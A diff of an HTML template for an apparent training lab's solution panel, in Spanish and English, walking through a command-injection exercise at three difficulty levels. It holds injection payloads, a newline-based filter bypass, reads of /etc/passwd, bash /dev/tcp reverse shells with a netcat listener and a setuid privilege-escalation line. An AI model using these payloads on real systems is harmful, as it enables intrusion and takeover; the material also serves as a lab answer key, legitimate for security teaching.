@@ -24,39 +24,55 @@
 
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
-    <h3>Pasos de explotación</h3>
+    <h3>Resumen</h3>
+    <p>El campo <code>host</code> termina dentro de un comando de shell sin sanitización. En Linux, el backend lo ejecuta como <code>alice</code>, así que una reverse shell caerá directamente en <code>/home/alice</code>.</p>
+
+    <h3>Easy</h3>
     <ol>
-      <li>El campo host termina dentro de un comando de shell sin sanitización. En Linux, el backend lo ejecuta como <code>alice</code>, así que una reverse shell caerá directamente en <code>/home/alice</code>.</li>
-      <li><strong>Easy:</strong> Usa cualquier separador de comandos:
+      <li>Usa separadores directos para confirmar la inyección:
         <pre>127.0.0.1; whoami
 127.0.0.1 && id
 127.0.0.1 | cat /etc/passwd
 127.0.0.1; ls -la /</pre></li>
-      <li><strong>Medium:</strong> Filtra <code>;</code> y <code>|</code> pero permite <code>&&</code> y newlines:
-        <pre># && sigue funcionando
-127.0.0.1 && whoami
-127.0.0.1 && cat /etc/passwd
-
-# Newline via Burp Suite (URL-encode: %0a)
-# En Burp Repeater, modifica el body POST:
-host=127.0.0.1%0awhoami</pre></li>
-      <li><strong>Hard:</strong> Filtra <code>; | &amp; ` $ ( ) { } &lt; &gt;</code> — solo el newline (<code>%0a</code>) funciona:
-        <pre># Intercepta con Burp Suite y modifica el body:
-host=127.0.0.1%0awhoami
-host=127.0.0.1%0acat%20/etc/passwd
-host=127.0.0.1%0aid</pre></li>
-      <li>Con curl (el <code>%0a</code> se interpreta como newline en el body):
-        <pre>curl -X POST http://TARGET_IP/cmdi/ping \
-  -d "host=127.0.0.1%0awhoami"</pre></li>
-      <li>Reverse shell para obtener la flag del lab (Easy/Medium):
-        <pre># En Kali, abre un listener:
+      <li>Lanza una reverse shell hacia Kali:
+        <pre># En Kali
 rlwrap nc -lvnp 4444
 
-# Easy
-127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'
+# Payload en el formulario
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+    </ol>
 
-# Medium
-127.0.0.1 &amp;&amp; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+    <h3>Medium</h3>
+    <ol>
+      <li>El filtro bloquea <code>;</code> y <code>|</code>, pero permite <code>&&</code> y newlines.</li>
+      <li>Comprueba ejecución de comandos:
+        <pre>127.0.0.1 && whoami
+127.0.0.1 && cat /etc/passwd</pre></li>
+      <li>Para Burp Repeater o una petición manual, también puedes usar newline URL-encoded:
+        <pre>host=127.0.0.1%0awhoami</pre></li>
+      <li>Lanza la reverse shell:
+        <pre># En Kali
+rlwrap nc -lvnp 4444
+
+# Payload en el formulario
+127.0.0.1 && bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+    </ol>
+
+    <h3>Hard</h3>
+    <ol>
+      <li>El filtro bloquea <code>; | &amp; ` $ ( ) { } &lt; &gt;</code>. El vector útil es el newline (<code>%0a</code>).</li>
+      <li>Intercepta la petición con Burp Suite y modifica el body:
+        <pre>host=127.0.0.1%0awhoami
+host=127.0.0.1%0acat%20/etc/passwd
+host=127.0.0.1%0aid</pre></li>
+      <li>Con curl, <code>%0a</code> también se interpreta como newline en el body:
+        <pre>curl -X POST http://TARGET_IP/cmdi/ping \
+  -d "host=127.0.0.1%0awhoami"</pre></li>
+      <li>En este nivel, usa la inyección para enumerar y validar ejecución. La obtención de shell interactiva depende de construir un payload compatible con el filtro activo.</li>
+    </ol>
+
+    <h3>Post-Explotación</h3>
+    <ol>
       <li>Cuando entre la shell, valida el contexto inicial. Debes aterrizar como <code>alice</code> en su home:
         <pre>whoami
 pwd
@@ -79,40 +95,56 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></li>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
-    <h3>Exploitation Steps</h3>
+    <h3>Overview</h3>
+    <p>The <code>host</code> field ends up inside a shell command without sanitization. On Linux, the backend executes it as <code>alice</code>, so a reverse shell lands directly in <code>/home/alice</code>.</p>
+
+    <h3>Easy</h3>
     <ol>
-      <li>The host field ends up inside a shell command without sanitization. On Linux, the backend executes it as <code>alice</code>, so a reverse shell lands directly in <code>/home/alice</code>.</li>
-      <li><strong>Easy:</strong> Use any command separator:
+      <li>Use direct separators to confirm command injection:
         <pre>127.0.0.1; whoami
 127.0.0.1 && id
 127.0.0.1 | cat /etc/passwd
 127.0.0.1; ls -la /</pre></li>
-      <li><strong>Medium:</strong> Filters <code>;</code> and <code>|</code> but allows <code>&&</code> and newlines:
-        <pre># && still works
-127.0.0.1 && whoami
-127.0.0.1 && cat /etc/passwd
-
-# Newline via Burp Suite (URL-encode: %0a)
-# In Burp Repeater, modify the POST body:
-host=127.0.0.1%0awhoami</pre></li>
-      <li><strong>Hard:</strong> Filters <code>; | &amp; ` $ ( ) { } &lt; &gt;</code> — only newline (<code>%0a</code>) works:
-        <pre># Intercept with Burp Suite and modify the body:
-host=127.0.0.1%0awhoami
-host=127.0.0.1%0acat%20/etc/passwd
-host=127.0.0.1%0aid</pre></li>
-      <li>With curl (<code>%0a</code> is interpreted as newline in the body):
-        <pre>curl -X POST http://TARGET_IP/cmdi/ping \
-  -d "host=127.0.0.1%0awhoami"</pre></li>
-      <li>Reverse shell to obtain the lab flag (Easy/Medium):
-        <pre># On Kali, start a listener:
+      <li>Launch a reverse shell back to Kali:
+        <pre># On Kali
 rlwrap nc -lvnp 4444
 
-# Easy
-127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'
+# Payload in the form
+127.0.0.1; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+    </ol>
 
-# Medium
-127.0.0.1 &amp;&amp; bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
-      <li>When the shell connects back, validate the starting context. You should land as <code>alice</code> in her home directory:
+    <h3>Medium</h3>
+    <ol>
+      <li>The filter blocks <code>;</code> and <code>|</code>, but still allows <code>&&</code> and newlines.</li>
+      <li>Confirm code execution:
+        <pre>127.0.0.1 && whoami
+127.0.0.1 && cat /etc/passwd</pre></li>
+      <li>For Burp Repeater or a manual request, you can also use a URL-encoded newline:
+        <pre>host=127.0.0.1%0awhoami</pre></li>
+      <li>Launch the reverse shell:
+        <pre># On Kali
+rlwrap nc -lvnp 4444
+
+# Payload in the form
+127.0.0.1 && bash -c 'bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1'</pre></li>
+    </ol>
+
+    <h3>Hard</h3>
+    <ol>
+      <li>The filter blocks <code>; | &amp; ` $ ( ) { } &lt; &gt;</code>. The useful primitive is a newline (<code>%0a</code>).</li>
+      <li>Intercept the request with Burp Suite and modify the body:
+        <pre>host=127.0.0.1%0awhoami
+host=127.0.0.1%0acat%20/etc/passwd
+host=127.0.0.1%0aid</pre></li>
+      <li>With curl, <code>%0a</code> is also interpreted as a newline in the body:
+        <pre>curl -X POST http://TARGET_IP/cmdi/ping \
+  -d "host=127.0.0.1%0awhoami"</pre></li>
+      <li>At this level, use the injection to enumerate and confirm execution. Getting a fully interactive shell depends on crafting a payload compatible with the active filter.</li>
+    </ol>
+
+    <h3>Post-Exploitation</h3>
+    <ol>
+      <li>When the shell connects back, validate the initial context. You should land as <code>alice</code> in her home directory:
         <pre>whoami
 pwd
 ls -la
